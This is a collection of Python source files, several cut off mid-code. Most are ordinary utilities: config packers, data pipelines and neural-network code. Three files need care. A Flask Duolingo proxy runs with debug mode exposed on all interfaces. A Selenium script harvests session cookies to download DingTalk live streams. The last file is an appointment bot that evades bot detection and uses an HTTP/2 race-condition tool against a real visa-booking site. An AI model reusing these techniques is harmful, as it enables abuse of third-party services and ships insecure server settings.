    "import os\nimport json\nfrom datetime import datetime\nimport base64\n\n# \u904d\u5386\u6587\u4ef6\u5939\uff0c\u5c06json\u6587\u4ef6\u8f6c\u4e3a\u5b57\u5178\ndef process_json_files(folder_path):\n    indexers = []\n    confs = {}\n    for filename in os.listdir(folder_path):\n        if filename.endswith(\".json\"):\n            filepath = os.path.join(folder_path, filename)\n            try:\n                with open(filepath, \"r\", encoding=\"utf-8\") as f:\n                    data = json.load(f)\n                    if isinstance(data, dict):\n                        indexer_data = {k: v for k, v in data.items() if k != \"conf\"}\n                        indexers.append(indexer_data)\n                        if \"conf\" in data:\n                            domain = data[\"domain\"].split(\"//\")[-1].split(\"/\")[0]\n                            confs[domain] = data[\"conf\"]\n                    else:\n                        print(f\"Error: {filename} cannot be converted to a dictionary.\")\n            except Exception as e:\n                print(f\"Error reading {filename}: {str(e)}\")\n    return indexers, confs\n\n# \u5c06\u6570\u636e\u4fdd\u5b58\u4e3ajson\u6587\u4ef6\ndef save_data_to_json(data, json_path, json_pack_path):\n    version = datetime.now().strftime(\"%Y%m%d%H%M\")\n    result = {\n        \"version\": version,\n        \"indexer\": data[0],\n        \"conf\": data[1]\n    }\n    with open(json_path, \"w\", encoding=\"utf-8\") as f:\n        json.dump(result, f, ensure_ascii=True, indent=4)\n\n    with open(json_pack_path, \"w\", encoding=\"utf-8\") as f:\n        json.dump(result, f, separators=(',', ':'), ensure_ascii=True)\n\n# \u5c06json\u6587\u4ef6\u8f6c\u6362\u4e3abase64\u5e76\u4fdd\u5b58\u5230dat\u6587\u4ef6\ndef save_json_to_dat(json_path, bin_path):\n    with open(json_path, \"r\", encoding=\"utf-8\") as f:\n        json_data = f.read()\n    base64_data = base64.b64encode(json_data.encode(\"utf-8\")).decode(\"utf-8\")\n    with open(bin_path, \"w\", encoding=\"utf-8\") as f:\n        f.write(base64_data)\n\n\ndef format_json_file(file_path):\n    \"\"\"\n    \u683c\u5f0f\u5316json\u6587\u4ef6\n    \"\"\"\n    with open(file_path, \"r\") as f:\n        try:\n            data = json.load(f)\n        except json.JSONDecodeError as e:\n            print(f\"Error decoding JSON in {file_path}: {e}\")\n            return\n\n    with open(file_path, \"w\") as f:\n        json.dump(data, f, indent=4)\n\ndef format_json_files_in_folder(folder_path):\n    \"\"\"\n    \u683c\u5f0f\u5316sites\u76ee\u5f55\u4e0b\u7684json\u6587\u4ef6\n    \"\"\"\n    for filename in os.listdir(folder_path):\n        file_path = os.path.join(folder_path, filename)\n        if os.path.isfile(file_path) and filename.lower().endswith(\".json\"):\n            format_json_file(file_path)\n\ndef create_or_clear_sites_file(sites_dat_path):\n    \"\"\"\n    \u521b\u5efa\u6216\u6e05\u7a7a\u6587\u4ef6\n    \"\"\"\n    if os.path.exists(sites_dat_path):\n        with open(sites_dat_path, \"w\") as f:\n            f.truncate(0)\n    else:\n        with open(sites_dat_path, \"w\") as f:\n            pass\n\ndef convert_base64_to_json(input_file_path, output_file_path):\n    \"\"\"\n    \u65e7\u7684json\u8f6c\u6362\u65b9\u6cd5\n    \"\"\"\n    with open(input_file_path, 'r') as input_file, open(output_file_path, 'w') as output_file:\n        line_number = 0\n        for line in input_file:\n            line_number += 1\n            try:\n                decoded_line = base64.b64decode(line.strip()).decode('utf-8')\n                json_data = json.loads(decoded_line)\n                json.dump(json_data, output_file)\n                output_file.write('\\n')\n            except Exception as e:\n                print(f\"Error on line {line_number}: {str(e)}\")\n            \nif __name__ == \"__main__\":\n    format_json_files_in_folder(\"sites\")\n    create_or_clear_sites_file(\"user.sites.bin\")\n    create_or_clear_sites_file(\"user.sites.json\")\n    create_or_clear_sites_file(\"user.sites.pack.json\")\n    indexers, confs = process_json_files(\"sites\")\n    data = (indexers, confs)\n    save_data_to_json(data, \"user.sites.json\", \"user.sites.pack.json\")\n    save_json_to_dat(\"user.sites.pack.json\", \"user.sites.bin\")\n\n    #\u65e7\u7684json\u8f6c\u6362\u65b9\u6cd5\n    # create_or_clear_sites_file(\"old/user.sites.old.json\")\n    # convert_base64_to_json(\"old/user.sites.dat\", \"old/user.sites.old.json\")\n",
    "import json \n\ndef generate(packages, name, version, depends):\n    packages[f\"{name}-{version}-0.tar.bz2\"] = {\n        \"build\": \"0\",\n        \"build_number\": 0,\n        \"depends\": depends,\n        \"license\": \"MIT\",\n        \"md5\": \"01aec23216fa8f6731e5a1c7e07743cd\",\n        \"name\": name,\n        \"noarch\": \"generic\",\n        \"sha256\": \"b6298acc2a1a03b5df97c27eb6692e3145c3193141751ad7461492d211e9efd5\",\n        \"size\": 5512,\n        \"subdir\": \"noarch\",\n        \"timestamp\": 1711774913896,\n        \"version\": version\n    }\n    return packages\n\npackages = {}\npackages = generate(packages, \"foo\", \"1.0\", [\"python\"])\npackages = generate(packages, \"foo\", \"2.0\", [\"python\", \"bar <2.0\", \"baz <2.0\"])\n\npackages = generate(packages, \"bar\", \"1.0\", [\"python\"])\npackages = generate(packages, \"bar\", \"2.0\", [\"python\", \"foo <2.0\", \"baz <2.0\"])\n\npackages = generate(packages, \"baz\", \"1.0\", [\"python\"])\npackages = generate(packages, \"baz\", \"2.0\", [\"python\", \"foo <2.0\", \"bar <2.0\"])\n\npackages = generate(packages, \"qux\", \"1.0\", [\"python\"])\npackages = generate(packages, \"qux\", \"2.0\", [\"python\", \"a <2.0\", \"b <2.0\"])\n\npackages = generate(packages, \"a\", \"1.0\", [\"python\"])\npackages = generate(packages, \"a\", \"2.0\", [\"python\", \"b <2.0\", \"qux <2.0\"])\n\npackages = generate(packages, \"b\", \"1.0\", [\"python\"])\npackages = generate(packages, \"b\", \"2.0\", [\"python\", \"a <2.0\", \"qux <2.0\"])\n\npackages = generate(packages, \"c\", \"1.0\", [\"python\"])\npackages = generate(packages, \"c\", \"2.0\", [\"python\", \"d <2.0\", \"e <2.0\"])\n\npackages = generate(packages, \"d\", \"1.0\", [\"python\"])\npackages = generate(packages, \"d\", \"2.0\", [\"python\", \"c <2.0\", \"e <2.0\"])\n\npackages = generate(packages, \"e\", \"1.0\", [\"python\"])\npackages = generate(packages, \"e\", \"2.0\", [\"python\", \"c <2.0\", \"d <2.0\"])\n\npackages = generate(packages, \"dumb\", \"1.0\", [\"python\", \"a <2.0\", \"foo <2.0\"])\n\nroot = {\n    \"info\": {\n        \"subdir\": \"noarch\"\n    },\n    \"packages\": packages,\n    \"packages.conda\": {},\n    \"removed\": [],\n    \"repodata_version\": 1\n}\n\nwith open(\"output.json\", \"w\") as outfile: \n    json.dump(root, outfile)",
    "import json\nimport flask\nimport duolingo\nimport inspect\nfrom gevent import pywsgi\nimport requests\n\nsource = inspect.getsource(duolingo)\nnew_source = source.replace('jwt=None', 'jwt')\nnew_source = source.replace('self.jwt = None', ' ')\nexec(new_source, duolingo.__dict__)\n\n# todo add an defaul account and use set_username() so no pw or jwt has to be provided\napp = flask.Flask(__name__)\napp.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16 MB\n\n\n@app.route('/test')\ndef hello_world():\n    return 'Hello, World!'\n\n\ndef jsonify_compact(*args, **kwargs):\n    response = flask.jsonify(*args, **kwargs)\n    response.data = response.get_data(as_text=True).replace('\\n', '').replace(\"\\\\\", \"\")\n    return response\n\n\n@app.route('/get_ui_language', methods=['POST'])\ndef get_ui_language():\n    jwt = flask.request.json.get('jwt')\n    username = flask.request.json.get('user')\n    try:\n        user = duolingo.Duolingo(username=username, jwt=jwt)\n    except Exception:\n        return flask.Response(\"{'success':'False'}\", status=401, mimetype='application/json')\n    return user.get_user_info()['ui_language']\n\n\n@app.route('/check_credentials', methods=['POST'])\ndef check_credentials():\n    jwt = flask.request.json.get('jwt')\n    username = flask.request.json.get('user')\n    try:\n        user = duolingo.Duolingo(username=username, jwt=jwt)\n    except requests.exceptions.ConnectTimeout:\n        return flask.Response(\"{'success':'False'}\", status=408, mimetype='application/json')\n    except Exception as e:  # User not found does only raise default exception\n        return flask.Response(\"{'success':'False'}\", status=401, mimetype='application/json')\n    return flask.Response(\"{'success':'True'}\", status=200, mimetype='application/json')\n\n\n@app.route(\"/get_language_abbreviations\", methods=['POST'])\ndef get_languages():\n    jwt = flask.request.json.get('jwt')\n    username = flask.request.json.get('user')\n    try:\n        user = duolingo.Duolingo(username=username, jwt=jwt)\n    except Exception as e:\n        print(e)\n        return flask.Response(\"{'success':'False'}\", status=401, mimetype='application/json')\n    return jsonify_compact(user.get_languages(abbreviations=True))\n\n\n@app.route(\"/get_language_name\", methods=['POST'])\ndef get_language_names():\n    jwt = flask.request.json.get('jwt')\n    username = flask.request.json.get('user')\n    lang = flask.request.json.get('lang')\n    try:\n        user = duolingo.Duolingo(username=username, jwt=jwt)\n    except Exception:\n        return flask.Response(\"{'success':'False'}\", status=401, mimetype='application/json')\n    return user.get_language_from_abbr(lang)\n\n\n@app.route(\"/get_full_language_info\", methods=['POST'])\ndef get_language_info():\n    jwt = flask.request.json.get('jwt')\n    username = flask.request.json.get('user')\n    lang = flask.request.json.get('lang')\n    try:\n        user = duolingo.Duolingo(username=username, jwt=jwt)\n    except Exception:\n        return flask.Response(\"{'success':'False'}\", status=401, mimetype='application/json')\n    return [user.get_languages(abbreviations=True), user.get_languages(abbreviations=False)]\n\n\n@app.route(\"/get_known_topics\", methods=['POST'])\ndef get_known_topics():\n    jwt = flask.request.json.get('jwt')\n    username = flask.request.json.get('user')\n    lang = flask.request.json.get('lang')\n    try:\n        user = duolingo.Duolingo(username=username, jwt=jwt)\n    except Exception:\n        return flask.Response(\"{'success':'False'}\", status=401, mimetype='application/json')\n    return sorted(user.get_known_topics(lang))\n\n\n@app.route(\"/get_vocabularies\", methods=['POST'])\ndef get_vocabulary():\n    jwt = flask.request.json.get('jwt')\n    username = flask.request.json.get('user')\n    lang = flask.request.json.get('lang')\n    try:\n        user = duolingo.Duolingo(username=username, jwt=jwt)\n        vocabs = json.dumps(user.get_vocabulary(lang, user.get_user_info()['ui_language']))\n        return flask.Response(str(vocabs), status=200, mimetype='application/json')\n    except Exception as e:\n        print(e)\n        return flask.Response(\"{'success':'False'}\", status=401, mimetype='application/json')\n\n\nif __name__ == '__main__':\n    app.run(ssl_context=('server.crt', 'server.key'), debug=True, port=5000, host=\"0.0.0.0\")\n",
    "import pandas as pd\n\nif 'transformer' not in globals():\n    from mage_ai.data_preparation.decorators import transformer\nif 'test' not in globals():\n    from mage_ai.data_preparation.decorators import test\n\n\n@transformer\ndef transform(data, *args, **kwargs):\n\n    data = data.dropna()\n\n    month_dict = {\n    \"January\": \"01\",\n    \"Jan.\": \"01\",\n    \"February\": \"02\",\n    \"March\": \"03\",\n    \"April\": \"04\",\n    \"May\": \"05\",\n    \"June\": \"06\",\n    \"July\": \"07\",\n    \"August\": \"08\",\n    \"September\": \"09\",\n    \"October\": \"10\",\n    \"November\": \"11\",\n    \"December\": \"12\",\n    \"Jan.\": \"01\",\n    \"Feb.\": \"02\",\n    \"Mar.\": \"03\",\n    \"Apr.\": \"04\",\n    \"May.\": \"05\",\n    \"Jun.\": \"06\",\n    \"Jul.\": \"07\",\n    \"Aug.\": \"08\",\n    \"Sept.\": \"09\",\n    \"Oct.\": \"10\",\n    \"Nov.\": \"11\",\n    \"Dec.\": \"12\"\n    }\n\n\n    def format_date(dt_string):\n        d = dt_string\n        \n        d_s = d.replace(',','').strip().split()\n        \n        if d_s[0] in month_dict:\n            d_s[0] = month_dict[d_s[0]]\n        d_s = d_s[:3]    \n        d_s = '-'.join(d_s)\n\n        return d_s\n\n\n    data['match_date'] = data['match_date'].apply(format_date)\n    data['match_date'] = pd.to_datetime(data['match_date']).dt.strftime('%Y-%m-%d')\n    data['extraction_date'] = pd.to_datetime(data['extraction_date'],format='%Y-%m-%d')\n\n    ###\n\n    def get_duration(duration):\n    \n        d = duration\n        \n        d = d.replace('m','').replace('s','').split()\n        \n        seconds = (int(d[0])*60) + int(d[1])\n        minutes = round(seconds/60,1)\n        \n        return minutes\n\n    data['match_length'] = data['match_length'].apply(get_duration)\n\n    return data\n\n\n@test\ndef test_output(output, *args) -> None:\n    \"\"\"\n    Template code for testing the output of the block.\n    \"\"\"\n    assert output is not None, 'The output is undefined'\n",
    "import os\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nimport time\nimport subprocess\nimport sys\nimport re\nimport tkinter as tk\nfrom tkinter import filedialog\n\n# \u5c06\u9519\u8bef\u4fe1\u606f\u8f93\u51fa\u5230\u7a7a\u6587\u4ef6\nnull_file = open(os.devnull, 'w')\nsys.stderr = null_file\n\n# \u5168\u5c40\u53d8\u91cf\uff0c\u7528\u4e8e\u5b58\u50a8\u6d4f\u89c8\u5668\u5bf9\u8c61\nbrowser = None\n\n# \u83b7\u53d6\u6d4f\u89c8\u5668Cookie\u7684\u51fd\u6570\uff0c\u7528\u6237\u624b\u52a8\u767b\u5f55\u540e\u8c03\u7528\ndef get_browser_cookie(url, browser_type='chrome'):\n    browser = None  # \u521d\u59cb\u5316\u6d4f\u89c8\u5668\u53d8\u91cf\n    if browser_type == 'chrome':\n        # Chrome WebDriver\u7684\u9009\u9879\n        chrome_options = webdriver.ChromeOptions()\n        chrome_options.add_argument('--disable-usb-device-event-log')\n        chrome_options.add_argument('--ignore-certificate-errors')\n        chrome_options.add_argument('--disable-logging')  # \u7981\u7528\u65e5\u5fd7\u8bb0\u5f55\n        chrome_options.add_argument('--log-level=3')  # \u8bbe\u7f6e\u65e5\u5fd7\u7ea7\u522b\u4e3a WARNING\n\n        # \u521b\u5efaChrome WebDriver\u5b9e\u4f8b\n        browser = webdriver.Chrome(options=chrome_options)\n    elif browser_type == 'edge':\n        # Edge WebDriver\u7684\u9009\u9879\n        edge_options = webdriver.EdgeOptions()\n        edge_options.add_argument('--disable-usb-device-event-log')\n        edge_options.add_argument('--ignore-certificate-errors')\n        edge_options.add_argument('--disable-logging')  # \u7981\u7528 Edge \u6d4f\u89c8\u5668\u7684\u65e5\u5fd7\u8f93\u51fa\n        edge_options.add_argument('--log-level=3')  # \u8bbe\u7f6e Edge \u6d4f\u89c8\u5668\u7684\u65e5\u5fd7\u7ea7\u522b\u4e3a ERROR\n        edge_options.add_argument('--silent')  # \u9759\u9ed8\u542f\u52a8\uff0c\u51cf\u5c11\u8f93\u51fa\n\n        # \u8bbe\u7f6e\u542f\u52a8 Edge \u6d4f\u89c8\u5668\u65f6\u4e0d\u663e\u793a\u65e5\u5fd7\u4fe1\u606f\n        edge_options.add_experimental_option('excludeSwitches', ['enable-logging'])\n\n        # \u521b\u5efaEdge WebDriver\u5b9e\u4f8b\n        browser = webdriver.Edge(options=edge_options)\n    elif browser_type == 'firefox':\n        # Firefox WebDriver\u7684\u9009\u9879\n        firefox_options = webdriver.FirefoxOptions()\n        firefox_options.add_argument('--disable-usb-device-event-log')\n        firefox_options.add_argument('--ignore-certificate-errors')\n        firefox_options.add_argument('--disable-logging')  # \u7981\u7528 Firefox \u6d4f\u89c8\u5668\u7684\u65e5\u5fd7\u8f93\u51fa\n        firefox_options.add_argument('--log-level=3')  # \u8bbe\u7f6e Firefox \u6d4f\u89c8\u5668\u7684\u65e5\u5fd7\u7ea7\u522b\u4e3a ERROR\n        firefox_options.add_argument('--silent')  # \u9759\u9ed8\u542f\u52a8\uff0c\u51cf\u5c11\u8f93\u51fa\n\n        # \u521b\u5efa Firefox WebDriver\u5b9e\u4f8b\n        browser = webdriver.Firefox(options=firefox_options)\n\n    # \u6253\u5f00\u6307\u5b9a\u7684URL\n    browser.get(url)\n\n    # \u7b49\u5f85\u7528\u6237\u624b\u52a8\u767b\u5f55\n    input(\"\u8bf7\u5728\u6d4f\u89c8\u5668\u4e2d\u767b\u5f55\u9489\u9489\u8d26\u6237\u540e\uff0c\u6309Enter\u952e\u7ee7\u7eed...\")\n\n    # \u83b7\u53d6\u8bf7\u6c42\u5934\u548c\u76f4\u64ad\u540d\u79f0\n    headers = browser.execute_script(\"return Object.fromEntries(new Headers(fetch(arguments[0], { method: 'GET' })).entries())\", url)\n    live_name_element = browser.find_element(By.CLASS_NAME, \"RccE3tVv\")\n    live_name = live_name_element.text\n    print(f\"\u76f4\u64ad\u540d\u79f0: {live_name}\")\n\n    # \u83b7\u53d6Cookie\n    cookies = browser.get_cookies()\n    cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}\n\n    return browser, cookie_dict, headers, live_name\n\n# \u91cd\u590d\u83b7\u53d6\u6d4f\u89c8\u5668Cookie\u7684\u51fd\u6570\uff0c\u65e0\u9700\u624b\u52a8\u786e\u8ba4\ndef repeat_get_browser_cookie(url):\n    global browser\n    if browser is None:\n        # Edge WebDriver\u7684\u9009\u9879\n        edge_options = webdriver.EdgeOptions()\n        edge_options.add_argument('--disable-usb-device-event-log')\n        edge_options.add_argument('--ignore-certificate-errors')\n        edge_options.add_argument('--disable-logging')  # \u7981\u7528 Edge \u6d4f\u89c8\u5668\u7684\u65e5\u5fd7\u8f93\u51fa\n        edge_options.add_argument('--log-level=3')  # \u8bbe\u7f6e Edge \u6d4f\u89c8\u5668\u7684\u65e5\u5fd7\u7ea7\u522b\u4e3a ERROR\n        edge_options.add_argument('--silent')  # \u9759\u9ed8\u542f\u52a8\uff0c\u51cf\u5c11\u8f93\u51fa\n\n        # \u8bbe\u7f6e\u542f\u52a8 Edge \u6d4f\u89c8\u5668\u65f6\u4e0d\u663e\u793a\u65e5\u5fd7\u4fe1\u606f\n        edge_options.add_experimental_option('excludeSwitches', ['enable-logging'])\n\n        # \u521b\u5efaEdge WebDriver\u5b9e\u4f8b\n        browser = webdriver.Edge(options=edge_options)\n\n    # \u6253\u5f00\u6307\u5b9a\u7684URL\n    browser.get(url)\n\n    #  \u7b49\u5f85\u9875\u9762\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u5305\u542b m3u8 \u94fe\u63a5\u7684\u7f51\u7edc\u8bf7\u6c42\n    m3u8_request = WebDriverWait(browser, 30).until(lambda x: any(\"m3u8\" in entry['name'] for entry in browser.execute_script(\"return window.performance.getEntriesByType('resource')\")))\n\n    # \u83b7\u53d6\u8bf7\u6c42\u5934\u548c\u76f4\u64ad\u540d\u79f0\n    headers = browser.execute_script(\"return Object.fromEntries(new Headers(fetch(arguments[0], { method: 'GET' })).entries())\", url)\n    live_name_element = browser.find_element(By.CLASS_NAME, \"RccE3tVv\")\n    live_name = live_name_element.text\n    print(f\"\u76f4\u64ad\u540d\u79f0: {live_name}\")\n\n    # \u83b7\u53d6Cookie\n    cookies = browser.get_cookies()\n    cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}\n\n    return cookie_dict, headers, live_name\n\n# \u4e0b\u8f7dm3u8\u6587\u4ef6\u7684\u51fd\u6570\ndef download_m3u8_file(url, filename, headers):\n    global browser\n    # \u6267\u884cJavaScript\u6765\u83b7\u53d6m3u8\u5185\u5bb9\n    m3u8_content = browser.execute_script(\"return fetch(arguments[0], { method: 'GET', headers: arguments[1] }).then(response => response.text())\", url)\n\n    # \u5c06m3u8\u5185\u5bb9\u4fdd\u5b58\u5230\u6587\u4ef6\n    with open(filename, 'w', encoding='utf-8') as f:\n        f.write(m3u8_content)\n\n    return filename\n\n# \u4eceURL\u4e2d\u63d0\u53d6\u524d\u7f00\u7684\u51fd\u6570\ndef extract_prefix(url):\n    # \u5b9a\u4e49\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\n    pattern = re.compile(r'(https?://[^/]+/live_hp/[0-9a-f-]+)')\n\n    # \u5728\u8f93\u5165\u94fe\u63a5\u4e2d\u67e5\u627e\u5339\u914d\u9879\n    match = pattern.search(url)\n\n    # \u8fd4\u56de\u63d0\u53d6\u7684\u5185\u5bb9\uff0c\u5982\u679c\u6709\u5339\u914d\u9879\u7684\u8bdd\n    if match:\n        return match.group(1)\n    else:\n        return url\n\n# \u66ff\u6362m3u8\u6587\u4ef6\u4e2d\u7684\u524d\u7f00\u7684\u51fd\u6570\ndef replace_prefix(m3u8_file, prefix):\n    updated_lines = []\n  ",
    "\n# This section was built with some help from Chat GPT. I wanted to see what it could create\n# I have actually just ended up using a dictionary on its own and not a class for the tokens.\n\nclass TokenManager:\n    def __init__(self, initial_tokens):\n        self.tokens = initial_tokens\n\n    def add_tokens(self, tokens_to_add):\n        for color, quantity in tokens_to_add.items():\n            self.tokens[color] += quantity\n\n    def remove_tokens(self, tokens_to_remove):\n        for color, quantity in tokens_to_remove.items():\n            if self.tokens[color] < quantity:\n                raise ValueError(f\"Not enough {color} tokens available\")\n            self.tokens[color] -= quantity\n\n    \"\"\"\n    def get_tokens(self):\n        return self.tokens.copy()\n    \"\"\"\n\n    def __str__(self):\n        return str(self.tokens)\n\n\n# Example usage:\n\"\"\"\ninitial_tokens = {'red': 7, 'blue': 7, 'green': 7, 'white': 7, 'black': 7, 'gold': 5}\ntoken_manager = TokenManager(initial_tokens)\n\nprint(\"Initial Tokens:\")\nprint(token_manager)\n\ntokens_to_add = {'red': 2, 'gold': 1}\ntoken_manager.add_tokens(tokens_to_add)\nprint(\"\\nAfter adding tokens:\")\nprint(token_manager)\n\ntokens_to_remove = {'green': 3, 'white': 2}\ntoken_manager.remove_tokens(tokens_to_remove)\nprint(\"\\nAfter removing tokens:\")\nprint(token_manager)\n\n\"\"\"\n",
    "import monai as mn\nimport glob\nimport numpy as np\nimport os\nfrom torch.utils.data import DataLoader\nimport torch\nfrom random import shuffle, seed\nimport lesion\nimport custom\nimport custom_cc\n\nfslab = [0,2,3,4,5,7,8,10,11,12,13,14,15,16,17,18,24,26,28,77,80,192,786]\ntargetlab = list(range(len(fslab)))\nlabmap = {}\nfor i, l in enumerate(fslab):\n    labmap[l] = i\n\nfsnames = [\"Background\"\n,\"Left cerebral white matter\"\n,\"Left cerebral cortex\"\n,\"Left lateral ventricle\"\n,\"Left inferior lateral ventricle\"\n,\"Left cerebellum white matter\"\n,\"Left cerebellum cortex\"\n,\"Left thalamus\"\n,\"Left caudate\"\n,\"Left putamen\"\n,\"Left pallidum\"\n,\"3rd ventricle\"\n,\"4th ventricle\"\n,\"Brain-stem\"\n,\"Left hippocampus\"\n,\"Left amygdala\"\n,\"CSF\"\n,\"Left accumbens area\"\n,\"Left ventral DC\"\n# ,\"Right cerebral white matter\"\n# ,\"Right cerebral cortex\"\n# ,\"Right lateral ventricle\"\n# ,\"Right inferior lateral ventricle\"\n# ,\"Right cerebellum white matter\"\n# ,\"Right cerebellum cortex\"\n# ,\"Right thalamus\"\n# ,\"Right caudate\"\n# ,\"Right putamen\"\n# ,\"Right pallidum\"\n# ,\"Right hippocampus\"\n# ,\"Right amygdala\"\n# ,\"Right accumbens area\"\n# ,\"Right ventral DC\"\n,\"WM Anomaly\"\n,\"Non-WM Anomaly\"\n,\"Corpus Callopsum\"\n,\"Stroke lesion\"]\n\nseed(0)\n\n# Add your ATLAS data paths here (or list of whatever stroke label niftis you have)\natlas_train_txt = \"/your/path/atlas_train.txt\"\natlas_val_txt = \"/your/path/atlas_val.txt\"\noasis_path = \"/your/path/here/\"\n\ndef printshape(x):\n    print(x.shape)\n    print(x.min(), x.max())\n    return x\n\n\ndef get_loaders(\n    batch_size=1,\n    fs_healthy=False,\n    mb_healthy=False,\n    device='cpu',\n    fade=False,\n    lowres=False,\n    ptch=128,\n):\n    train_files = glob.glob(os.path.join(oasis_path, \"OAS*/OAS*_Freesurfer*/DATA/OAS*/mri/mni_1mm_healthy_symmetric.nii.gz\"))\n    train_dict = [\n        {\"healthy\": f, \"label\": f.replace(\"healthy_symmetric\", \"mb_labels\")}\n        for f in train_files\n    ]\n\n    shuffle(train_dict)\n\n    train_dict, val_dict = (\n        train_dict[: -100],\n        train_dict[-100 :],\n    )\n\n    print(f\"\\nHealthy labels: Train {len(train_dict)} Val {len(val_dict)}\\n\")\n\n    train_label_list = list(np.loadtxt(atlas_train_txt, dtype=str))\n    val_label_list = list(np.loadtxt(atlas_val_txt, dtype=str))\n\n    print(f\"\\nLesion labels: Train {len(train_label_list)} Val {len(val_label_list)}\\n\")\n\n    if lowres:\n        train_label_list = [lst.replace('1mm','2mm') for lst in train_label_list]\n        val_label_list = [lst.replace('1mm','2mm') for lst in val_label_list]\n    \n    train_transform = mn.transforms.Compose(\n        transforms=[\n            mn.transforms.LoadImageD(keys=[\"label\",\"healthy\"], image_only=True),\n            mn.transforms.EnsureChannelFirstD(keys=[\"label\",\"healthy\"]),\n            mn.transforms.SpacingD(keys=[\"label\",\"healthy\"], pixdim=1 if not lowres else 2),\n            mn.transforms.ResizeWithPadOrCropD(\n                keys=[\"label\",\"healthy\"], spatial_size=(256, 256, 256) if not lowres else (128, 128, 128)\n            ),\n            mn.transforms.ToTensorD(dtype=float, keys=[\"label\",\"healthy\"], device=device),\n            mn.transforms.LambdaD(keys=[\"healthy\"], \n                                func=mn.transforms.MapLabelValue(orig_labels=fslab, \n                                target_labels=targetlab)) if fs_healthy else mn.transforms.AsDiscreteD(keys=\"healthy\", threshold=0.5),\n            mn.transforms.AsDiscreteD(keys=\"healthy\", to_onehot=len(fslab)-1) if fs_healthy else mn.transforms.IdentityD(keys=\"label\"),\n            lesion.LesionPasteD(\n                keys=\"label\", new_keys=[\"seg\"], label_list=train_label_list, fs_healthy=fs_healthy, mb_healthy=mb_healthy, lesion_fading=fade\n            ),\n            mn.transforms.AsDiscreteD(keys=\"seg\", to_onehot=2) if not fs_healthy and not mb_healthy else mn.transforms.IdentityD(keys=\"label\"),\n            custom_cc.CCSynthSeg(label_key='label', image_key='image', coreg_keys=['seg','healthy']),\n            custom.RemapSegToLabel(in_key=\"seg\", out_key=\"label\"),\n            mn.transforms.RandSpatialCropD(\n                keys=[\"image\", \"label\", \"seg\", \"healthy\"], roi_size=(ptch, ptch, ptch), random_size=False\n            ) if not lowres else mn.transforms.IdentityD(keys=\"label\"),\n            mn.transforms.OneOf(\n                transforms=[\n                    custom.RandomSkullStrip(\n                        label_key=\"healthy\",\n                        image_key=[\"image\",\"label\"],\n                        out_key=\"mask\",\n                        channels_to_use=targetlab[1:] if fs_healthy else [0],\n                        dilate_prob=0.3,\n                        erode_prob=0.3,\n                    ),\n                    mn.transforms.IdentityD(keys=[\"image\"]),\n                ],\n                weights=[0.3, 0.7],\n            ),\n            mn.transforms.RandAxisFlipd(keys=[\"image\", \"label\"], prob=0.8),\n            mn.transforms.RandAxisFlipd(keys=[\"image\", \"label\"], prob=0.8),\n            mn.transforms.RandAxisFlipd(keys=[\"image\", \"label\"], prob=0.8),\n            mn",
    "import torch\n\n\nclass MLP(torch.nn.Module):\n    \"\"\"\n    Configurable multilayer perceptron\n    \"\"\"\n\n    def __init__(\n        self,\n        in_size: int,  # Input parameter size\n        hidden_size: int,  # Hidden layer size\n        out_size: int,  # Output parameter size\n        num_layers: int,  # Number of hidden layers\n        activation: torch.nn.Module = torch.nn.Sigmoid(),  # Activation function\n        scale_output: bool = False,  # Scale output to [-1, 1]\n        input_bias: float = 0.0,  # Bias for the input layer\n        layer_norm: bool = False,  # Use layer normalization\n        normalize_input: bool = False,  # Normalize input\n        init_std: float = 1e-3,  # Standard deviation of initial weights\n    ):\n        super().__init__()\n        channels = [in_size] + (num_layers) * [hidden_size]\n        net = []\n        for i in range(num_layers):\n            net.append(torch.nn.Linear(channels[i], channels[i + 1]))\n            if layer_norm:\n                net.append(\n                    torch.nn.LayerNorm(channels[i + 1], elementwise_affine=False)\n                )\n            net.append(activation)\n\n        net.append(torch.nn.Linear(channels[-1], out_size))\n        self.in_size = in_size\n        self.net = torch.nn.Sequential(*net)\n        self.scale_output = scale_output\n        self.input_bias = input_bias\n        self.normalize_input = normalize_input\n        self.init_std = init_std\n        self.apply(self._init_weights)\n\n    def _init_weights(self, m):\n        if isinstance(m, torch.nn.Linear):\n            with torch.no_grad():\n                if isinstance(m, torch.nn.Linear) and m.bias is not None:\n                    torch.nn.init.constant_(m.bias, 0)\n                torch.nn.init.normal_(m.weight, 0, self.init_std)\n\n    def forward(self, x: torch.Tensor):\n        x = x + self.input_bias\n        x = self.net(x)\n        if self.scale_output:\n            x = torch.tanh(x)\n        return x\n",
    "import asyncio\nfrom telegram import Bot\nfrom telegram import InputFile\nclass MyCustomError(Exception):\n    pass\nclass BlsFacilateWork:\n    \n    from selenium.webdriver.support.wait import WebDriverWait\n    from seleniumwire import webdriver\n    from selenium.webdriver.common.keys import Keys\n    from selenium.webdriver.common.by import By\n    from selenium.webdriver.support.wait import WebDriverWait\n    from selenium.webdriver.support import expected_conditions as EC\n    from selenium.webdriver.common.action_chains import ActionChains\n    from PIL import Image\n    import io\n    import time\n    #from undetected_chromedriver import Chrome\n    from undetected_chromedriver import Chrome, ChromeOptions\n    from selenium.webdriver.support.ui import Select\n    import json\n    from selenium.webdriver.common.alert import Alert\n    #import pygame\n    from bs4 import BeautifulSoup\n    import json\n    import queue\n    from urllib.parse import quote,urlparse, parse_qs, unquote\n\n    def get_available_date_hours(self,headerr,bodyy,session_number):\n        from h2spacex import H2OnTlsConnection\n        from time import sleep\n        from h2spacex import h2_frames\n        import re\n        \n        h2_conn = H2OnTlsConnection(\n    hostname='algeria.blsspainglobal.com',\n    port_number=443\n)\n\n        h2_conn.setup_connection()\n        headers = headerr\n        body = bodyy\n        stream_ids_list = [1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59]\n        self.key_date_list= {'2024-02-21': 43, '2024-02-22': 45, '2024-02-23': 47, '2024-02-24': 49, '2024-02-25': 51, '2024-02-28': 53, '2024-02-29': 55, '2024-02-30': 57, '2024-02-31': 59, '2024-03-01': 1, '2024-03-04': 3, '2024-03-05': 5, '2024-03-06': 7, '2024-03-07': 